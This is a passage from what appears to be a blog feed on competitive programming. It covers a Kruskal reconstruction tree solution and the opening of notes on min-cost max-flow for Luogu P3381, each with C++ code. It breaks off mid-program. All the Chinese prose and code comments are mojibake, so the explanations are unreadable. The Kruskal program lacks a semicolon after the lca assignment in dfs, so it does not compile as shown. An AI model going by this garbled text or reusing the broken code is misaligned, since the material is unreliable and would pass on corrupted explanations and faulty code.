èƒ½è·å¾—ä¸€å®šèƒ½åŠ›å€¼ï¼Œæ¯ä¸ªåœ°æ–¹çš„èƒ½åŠ›å€¼åªèƒ½è·å¾—ä¸€æ¬¡ï¼Œåªæœ‰èƒ½åŠ›å€¼ä¸å°äºè¾¹æƒæˆ‘æ‰èƒ½é€šè¿‡è¿™æ¡è¾¹åˆ°è¾¾å¦ä¸€ä¸ªç‚¹ã€‚ç»™å®šèµ·ç‚¹å’Œåˆå§‹èƒ½åŠ›å€¼ï¼Œé—®ä½ æœ€åæœ€å¤šæœ‰å¤šå°‘èƒ½åŠ›å€¼ã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬èƒ½ä¸èƒ½åˆ°è¾¾å¦ä¸€ä¸ªç‚¹å–å†³äºæ•´æ¡è·¯ç»çš„æœ€å¤§å€¼æ˜¯å¦å¤§äºæˆ‘çš„èƒ½åŠ›å€¼ï¼Œè‹¥å¤§äºåˆ™æˆ‘ä¸èƒ½é€šè¿‡è¿™æ¡è·¯åˆ°è¾¾è¯¥ç‚¹ï¼Œå¦‚æœè¯¥æœ€å¤§å€¼æœ€å°ï¼Œåˆ™ä»¥æˆ‘ç›®å‰èƒ½åŠ›å€¼æ— æ³•åˆ°è¾¾è¯¥ç‚¹ã€‚</p><p>æˆ‘ä»¬å°±ä½¿ç”¨ $\text{Kruskal}$ æ„é€ æ ‘ï¼Œå¯»æ‰¾å®ƒçš„ç¥–å…ˆèŠ‚ç‚¹ï¼Œå¯ä»¥è¯æ˜ï¼Œå®ƒç¥–å…ˆèŠ‚ç‚¹ä¸€å®šä¸æ˜¯å¶èŠ‚ç‚¹ï¼Œæ‰€ä»¥å¦‚æœæˆ‘çš„èƒ½åŠ›å€¼å¤§äºè¯¥ç¥–å…ˆèŠ‚ç‚¹çš„å€¼ï¼Œé‚£ä¹ˆæˆ‘å¯ä»¥ä»»æ„è®¿é—®ä»¥è¿™ä¸ªç¥–å…ˆèŠ‚ç‚¹ä¸ºæ ¹èŠ‚ç‚¹çš„ä»»æ„èŠ‚ç‚¹ï¼Œèƒ½åŠ›å€¼å¯ä»¥ç›´æ¥åŠ ä¸Šè¿™ä¹ˆå¤šï¼Œç„¶åå†å»å¯»æ‰¾ç¥–å…ˆèŠ‚ç‚¹ï¼Œç›´åˆ°è¿å®ƒçš„çˆ¶äº²éƒ½æ— æ³•åˆ°è¾¾æˆ–è€…æ˜¯å½“å‰èŠ‚ç‚¹å·²ç»æ˜¯æ ¹èŠ‚ç‚¹äº†ï¼Œé‚£å°±ç»“æŸï¼Œé‚£ä¹ˆæˆ‘æœ€ç»ˆè·å¾—çš„èƒ½åŠ›å€¼å°±æ˜¯å½“å‰èŠ‚ç‚¹ä¸ºæ ¹èŠ‚ç‚¹çš„å­æ ‘çš„æ‰€æœ‰èƒ½åŠ›å€¼ä¹‹å’ŒåŠ ä¸Šåˆå§‹å€¼ã€‚</p><p>ä»¥æŸæŸèŠ‚ç‚¹ä¸ºæ ¹èŠ‚ç‚¹çš„å­æ ‘èƒ½åŠ›å€¼ä¹‹å’Œå¯ä»¥é€šè¿‡ dfs åœ¨ $O(E)$ çš„å¤æ‚åº¦å¾—å‡ºï¼Œæ’åº+ $\text{Kruskal}$ æ„é€ æ ‘ $O(E)+O(Elog_2E)$ çš„å¤æ‚åº¦ã€‚å¯»æ‰¾æ ¹èŠ‚ç‚¹å¯ä»¥ç”¨é¢„å¤„ç†å€å¢æŸ¥è¯¢çš„æ–¹å¼å»å¾—åˆ°ã€‚è¿™æ ·æœ€ç»ˆæˆ‘ä»¬æ¯æ¬¡æŸ¥è¯¢çš„å¤æ‚åº¦å°±æ˜¯ $O(log_2n)$ çš„å¤æ‚åº¦ã€‚åœ¨æœ¬é¢˜æˆ‘ä»¬å¯ä»¥è®¤ä¸ºå®ƒéƒ½æ˜¯ $n$ ï¼Œå› ä¸ºå®ƒä»¬çš„æœ€å¤§å€¼éƒ½æ˜¯ä¸€æ ·çš„ï¼Œè¿™æ ·çš„å¤æ‚åº¦æœ€ç»ˆèƒ½è¢«æ¥å—ã€‚</p><p>è¿™é‡Œç»™å‡ºæˆ‘å†™çš„ç¨‹åºã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="comment">//intä¸å¤Ÿç›´æ¥intæ”¹long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> from;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cin&gt;&gt;from&gt;&gt;to&gt;&gt;w;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt;(<span class="keyword">const</span> eee &amp;a)&#123;<span class="comment">//é‡è½½å°äºå·ä¾¿äºæ’åº</span></span><br><span class="line">        <span class="keyword">return</span> w&lt;a.w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;e[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> v[maxn&lt;&lt;<span class="number">1</span>],root[maxn&lt;&lt;<span class="number">1</span>],fa[maxn&lt;&lt;<span class="number">1</span>],value[maxn&lt;&lt;<span class="number">1</span>],a[maxn&lt;&lt;<span class="number">1</span>],dep[maxn&lt;&lt;<span class="number">1</span>],n,m,q,cnt;</span><br><span class="line"><span class="keyword">int</span> lca[maxn&lt;&lt;<span class="number">1</span>][<span class="number">30</span>];<span class="comment">//è¿™é‡Œå¿˜å¼€ä¸¤å€å†…å­˜å¯¼è‡´2å°æ—¶çš„TLE RE WAå„ç§çš„é—®é¢˜ã€‚</span></span><br><span class="line"><span class="comment">//vè¡¨ç¤ºèŠ‚ç‚¹æƒå€¼ï¼Œvalueè¡¨ç¤ºå­æ ‘aå’Œï¼Œaè¡¨ç¤ºè¯¥ç‚¹çš„èƒ½é‡ </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    edge[++cnt]=&#123;y,root[x]&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> fa[x] == x ? x : fa[x] = <span class="built_in">find</span>(fa[x]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Kruskal</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2</span>*n<span class="number">-1</span>;i++)fa[i]=i;<span class="comment">//åˆå§‹åŒ–é›†åˆ</span></span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> from=e[i].from,to=e[i].to;</span><br><span class="line">        from=<span class="built_in">find</span>(from),to=<span class="built_in">find</span>(to);<span class="comment">//å¯»æ‰¾å¹¶æŸ¥é›†</span></span><br><span class="line">        <span class="keyword">if</span>(from==to)<span class="keyword">continue</span>;</span><br><span class="line">        v[++j+n]=e[i].w;<span class="comment">//æ–°å»ºä¸€ä¸ªç‚¹ï¼Œç‚¹æƒä¸ºè¯¥è¾¹è¾¹æƒï¼Œå¹¶è¿æ¥è¿™ä¸¤ä¸ªç‚¹</span></span><br><span class="line">        <span class="built_in">add</span>(from,j+n);<span class="comment">//æ·»åŠ ä¸¤ä¸ªè¾¹ã€‚</span></span><br><span class="line">        <span class="built_in">add</span>(j+n,from);</span><br><span class="line">        <span class="built_in">add</span>(to,j+n);</span><br><span class="line">        <span class="built_in">add</span>(j+n,to);</span><br><span class="line">        fa[from]=fa[j+n];<span class="comment">//è®©è¿™ä¸¤ä¸ªç‚¹çš„çˆ¶äº²éƒ½æŒ‡å‘è¿™ä¸ªèŠ‚ç‚¹ï¼Œè¿™å…¶å®ç›¸å½“äºä¸€ä¸ªé›†åˆçš„åˆå¹¶ã€‚</span></span><br><span class="line">        fa[to]=fa[j+n];</span><br><span class="line">        <span class="keyword">if</span>(j==n<span class="number">-1</span>)<span class="keyword">break</span>;<span class="comment">//å¯»æ‰¾åˆ°n-1æ¡è¾¹ä¹‹ååˆ™ç›´æ¥é€€å‡º</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> father)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=a[now];</span><br><span class="line">    fa[now]=father;</span><br><span class="line">    lca[now][<span class="number">0</span>]=father;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="number">17</span>;i++)&#123;</span><br><span class="line">        lca[now][i]=lca[lca[now][i<span class="number">-1</span>]][i<span class="number">-1</span>]<span class="comment">//ç›´æ¥æ•´ï¼Œæš´åŠ›å‡ºlog_2(1e5)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[now];i;i=edge[i].next)&#123;<span class="comment">//æœ´å®æ— åçš„æ·±æœ</span></span><br><span class="line">        <span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(to==father)<span class="keyword">continue</span>;</span><br><span class="line">        ans+=<span class="built_in">dfs</span>(to,now);</span><br><span class="line">    &#125;</span><br><span class="line">    value[now]=ans;<span class="comment">//ä¿å­˜è¯¥èŠ‚ç‚¹ä¸ºæ ¹èŠ‚ç‚¹æ—¶çš„æ‰€æœ‰å­å­™èŠ‚ç‚¹ä¸Šçš„èƒ½åŠ›å€¼</span></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;q;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        e[i].<span class="built_in">read</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ä»¥ä¸Šä¸ºè¾“å…¥</span></span><br><span class="line">    <span class="built_in">sort</span>(e+<span class="number">1</span>,e+<span class="number">1</span>+m);<span class="comment">//è¾¹æŒ‰ç…§æƒå€¼æ’åº</span></span><br><span class="line">    <span class="built_in">Kruskal</span>();<span class="comment">//é‡æ„æ ‘</span></span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">2</span>*n<span class="number">-1</span>,<span class="number">0</span>);<span class="comment">//æ·±æœå¡«valueï¼Œè·å¾—ä»¥æ¯ä¸ªèŠ‚ç‚¹ä¸ºæ ¹èŠ‚ç‚¹èƒ½è·å¾—çš„èƒ½åŠ›å€¼ï¼Œé¡ºä¾¿å¤„ç†ä¸€ä¸‹LCA</span></span><br><span class="line">    v[<span class="number">0</span>]=<span class="number">1e18</span>;<span class="comment">//é˜²æ­¢åˆ°0ä¹‹åæ— æ³•ç»ˆæ­¢é€’å½’</span></span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,k;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;k;</span><br><span class="line">        <span class="keyword">int</span> t=x;</span><br><span class="line">        <span class="keyword">int</span> now=value[x]+k;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> las = x;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">20</span>;i &gt;= <span class="number">0</span>;--i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> fa = lca[x][i];</span><br><span class="line">                <span class="keyword">if</span>(now &gt;= v[fa]) x = fa;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(x == las)<span class="keyword">break</span>;</span><br><span class="line">            now = value[x] + k;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;now&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//å®Œç»“æ’’èŠ±</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºæ³¨é‡Šæåˆ°äº†ï¼Œå’±å› ä¸ºæ•°ç»„è¶Šç•ŒæŸ¥äº†ä¸¤ä¸ªå°æ—¶çš„é”™è¯¯ï¼Œç¡¬ç”Ÿç”Ÿæ²¡çœ‹åˆ°LCAæ²¡æœ‰å¼€ä¸¤å€çš„å†…å­˜ã€‚</p><p><img src="/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/5.png" alt="5"></p><p>åˆä¸€å›¾è®ºç®—æ³•æ”¶å…¥å›Šä¸­ï¼ŒæŒºå¼€å¿ƒçš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å›¾è®º </category>
          
          <category> Kruskalé‡æ„ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æœ€å°è´¹ç”¨æœ€å¤§æµç¬”è®°</title>
      <link href="/2022/03/05/%E6%9C%80%E5%B0%8F%E8%B4%B9%E7%94%A8%E6%9C%80%E5%A4%A7%E6%B5%81%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/03/05/%E6%9C%80%E5%B0%8F%E8%B4%B9%E7%94%A8%E6%9C%80%E5%A4%A7%E6%B5%81%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>æ—¶éš”å¤šæ—¥ï¼Œåˆä¸€æ¨¡æ¿æ”¶å…¥å…¶ä¸­ï¼šæœ€å°è´¹ç”¨æœ€å¤§æµã€‚</p><span id="more"></span><h2 id="æ¦‚å¿µå¼•å…¥"><a href="#æ¦‚å¿µå¼•å…¥" class="headerlink" title="æ¦‚å¿µå¼•å…¥"></a>æ¦‚å¿µå¼•å…¥</h2><ul><li>è´¹ç”¨ï¼šå¯¹æ¯æ¡æœ‰å‘è¾¹æ–°å¢çš„ä¸€ä¸ªå±æ€§ï¼Œè´¹ç”¨è¡¨ç¤ºæ¯ä¸ªç»è¿‡è¿™æ¡è¾¹çš„ä¸€ä¸ªå•ä½æµé‡å°†ä¼šæ·»åŠ è¿™ä¹ˆå¤šè´¹ç”¨ã€‚</li></ul><p>å°†æŠ½è±¡çš„é—®é¢˜å…·è±¡åŒ–ï¼šåœ¨ä¸€å¼ é«˜é€Ÿç½‘ä¸­æœ‰ $n$ ä¸ªæ”¶è´¹ç«™ï¼Œ$m$ æ¡å•å‘é€šè¡Œçš„é“è·¯ï¼Œæ¯èµ°å®Œä¸€æ¡é“è·¯å°±ä¼šåˆ°é‚£è¾¹çš„æ”¶è´¹ç«™æ”¶è´¹ï¼Œæ”¶è´¹ä»·æ ¼ä¼šæ ¹æ®ä½ èµ°çš„å“ªæ¡è·¯æ”¶è´¹ï¼Œè€Œä¸æ˜¯å›ºå®šçš„æ”¶è´¹ç‚¹å°±æ”¶å›ºå®šçš„é’±ï¼Œè¿™ä¸ªä¹Ÿå¾ˆåˆé€»è¾‘å§ã€‚ç„¶åä¸€æ¡é“è·¯æœ€å¤šåŒè¡Œ $w$ è¾†è½¦ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ¡è·¯ä¸€æ—¦èµ°è¿‡è¶…è¿‡ $w$ è¾†è½¦é‚£è¿™æ¡è·¯å°†ä¸å†æ”¾è¡Œï¼Œè™½ç„¶ä¸ç¬¦åˆæˆ‘ä»¬çš„è®¤çŸ¥ä½†æ˜¯ä»–å°±è¿™ä¹ˆè§„å®šäº†ä½ ä¹Ÿæ²¡åŠæ³•å˜›å¯¹å§ã€‚åœ¨ $n$ ä¸ªæ”¶è´¹ç«™æœ‰ä¸€ä¸ªæºæ”¶è´¹ç«™ä¸€ä¸ªç›®çš„æ”¶è´¹ç«™ï¼Œé—®æœ€å¤šæœ‰å¤šå°‘è¾†è½¦èƒ½ä»æºæ”¶è´¹ç«™åˆ°ç›®çš„æ”¶è´¹ç«™ï¼Œæ€»è´¹ç”¨æœ€å°çš„é€šè¡Œæ–¹æ¡ˆæ˜¯å¤šå°‘ã€‚</p><h2 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><p>ä¹ä¸€å¬å¥½åƒæ²¡å•¥æ€è·¯ï¼Œä½†æ˜¯ä»ä¸€ä¸ªå¸æœºçš„è§’åº¦å»è€ƒè™‘ï¼Œè¿™å°±ä¼šå˜å¾—ç®€å•äº†ï¼Œå› ä¸ºå¯¹äºä¸€ä¸ªå¸æœºæ¥è¯´ï¼Œæˆ‘çš„ç›®æ ‡æ˜¯åˆ°è¾¾ç›®çš„æ”¶è´¹ç«™ä¸”ä½¿æˆ‘èŠ±è´¹æœ€å°‘ã€‚é‚£ä¹ˆèµ·ç‚¹ç»ˆç‚¹ç¡®å®šäº†ï¼Œæ¯æ¡è·¯æ”¶è´¹ç¡®å®šäº†ï¼Œæ”¶è´¹ç«™ä¹‹é—´çš„é“è·¯ä¹Ÿç¡®å®šäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¥æ”¶è´¹ä¸ºè¾¹æƒè®¡ç®—æˆ‘åˆ°ç»ˆç‚¹çš„å•æºæœ€çŸ­è·¯ä¸å°±å¯ä»¥äº†ä¹ˆï¼Œèµ°å•æºæœ€çŸ­è·¯ä¸€å®šä¼šä½¿å¾—æˆ‘çš„èŠ±è´¹æœ€å°‘ï¼Œå› ä¸ºè¾¹æƒæ˜¯è´¹ç”¨ï¼Œæœ€çŸ­åœ¨æŸç§æ„ä¹‰ä¸Šå°±æ˜¯è´¹ç”¨æœ€å°‘å•¦ã€‚</p><p> ä½†æ˜¯æˆ‘ä»¬æ˜¯ä¸å¯èƒ½ä¸ºæ¯ä¸€ä¸ªå¸æœºè€ƒè™‘çš„ï¼Œæˆ‘ä»¬å¯ä»¥æœå‡ºä¸€æ¡å•æºæœ€çŸ­è·¯ï¼Œé‚£ä¹ˆå°±å¾ˆå®¹æ˜“è®¡ç®—è¿™æ¡è·¯ä¸Šçš„æ€»è´¹ç”¨å’Œæœ€å°æµé‡ã€‚é‚£ä¹ˆè¿™ä¸€æ¬¡æˆ‘å°±ç›¸å½“äºé€šè¿‡äº†ï¼Œ<strong>æœ€å°æµé‡</strong> è¾†è½¦ï¼Œè´¹ç”¨ç›¸å½“äºå¤šäº† <strong>æœ€å°æµé‡$\times$ æ€»è´¹ç”¨</strong> ã€‚è¿™é‡Œå°±è·Ÿç½‘ç»œæµæœ‰ç‚¹ç±»ä¼¼äº†ï¼Œæˆ‘æ±‚å•æºæœ€çŸ­è·¯çš„è¿‡ç¨‹ä¹Ÿå¯ä»¥è§†ä¸ºæ‰¾ä¸€æ¡å¢å¹¿è·¯ã€‚åœ¨ç»“æœä¿å­˜ä¹‹åæˆ‘ä»¬ä¾ç„¶è¦æ·»åŠ åå‘è¾¹ï¼Œç„¶åå¯¹åº”æµé‡å‡å°‘ï¼Œåå‘è¾¹æµé‡å¢åŠ ã€‚ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦æ³¨æ„è¿™ä¸ªåå‘è¾¹è´¹ç”¨æ˜¯å¤šå°‘å‘¢ï¼Ÿå…¶å®å¾ˆå¥½ç†è§£ï¼Œæˆ‘ä¸€è¾†è½¦è¿‡å»ï¼Œå†å›æ¥ï¼Œå¯¹è½¦æ¥è¯´ç›¸å½“äºæ²¡è¿‡å»ï¼Œä¹Ÿå°±æ²¡æœ‰èŠ±è´¹<del>è™½ç„¶å®é™…æƒ…å†µä¸æ˜¯è¿™æ ·</del>ï¼Œæ‰€ä»¥æˆ‘ä»¬æ·»åŠ åå‘è¾¹çš„æ—¶å€™è¦ç»™è·¯å¾„é•¿åº¦ä¸ºè´Ÿè¾¹æƒã€‚è¿™æ ·å°±å†³å®šäº†æˆ‘ä»¬åªèƒ½è€ƒè™‘æŸå·²æ­»ç®—æ³•ï¼Œè™½ç„¶ä½ å¯ä»¥ç»™æ‰€æœ‰è¾¹æƒåŠ ä¸Šä¸€ä¸ªæœ€å¤§å€¼ä½¿å¾—æ¯ä¸ªè¾¹æƒä¸ºæ­£ï¼Œæœ€åè·‘å®Œ $\text{dijkstra}$ ä¹‹åå†æ¯æ¡è¾¹å‡å»è¿™ä¹ˆå¤šã€‚ä½†æ˜¯å®é™…æˆ‘å†™å‡ºæ¥å¹¶ä¸è¡Œï¼Œä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œä½†æ˜¯å¬è¯´ç½‘ç»œæµæœ‰ä¸æˆæ–‡çš„è§„å®šï¼š</p><p>æœ‰ä»¥ä¸‹æƒ…å†µä¹‹ä¸€çš„ï¼š</p><ol><li>ç½‘ç»œæµå¡ $\text{Dinic}$ ç®—æ³•ã€‚</li><li>è´¹ç”¨æµå¡ $\text{spfa}$ ç®—æ³•ã€‚</li></ol><p>æŒ‰ç…§è§„å®šå…¶æ—è°±å°†è¢«ä¸‡äººé—®å€™ã€‚</p><p>æœ€åä¸€ç‚¹éœ€è¦æ³¨æ„ï¼šä¸€æ¡è¾¹æµé‡ä¸º $0$ ä¹‹åï¼Œå®ƒåº”è¢«è§†ä¸ºæ–­å¼€ã€‚</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><p>æ¨¡æ¿é¢˜ï¼š<a href="https://www.luogu.com.cn/problem/P3381">P3381</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inf 0x3f3f3f3f3f3f3f3f</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; P;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">int</span> d;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ppp</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line">    <span class="keyword">int</span> edge;</span><br><span class="line">&#125;pre[maxn];</span><br><span class="line"><span class="keyword">int</span> s,t,ans,n,m,cnt;</span><br><span class="line"><span class="keyword">int</span> root[maxn],dis[maxn],inque[maxn],vis[maxn];</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w,<span class="keyword">int</span> d)</span></span>&#123;</span><br><span class="line">    edge[++cnt]=&#123;y,w,d,root[x]&#125;;</span><br><span 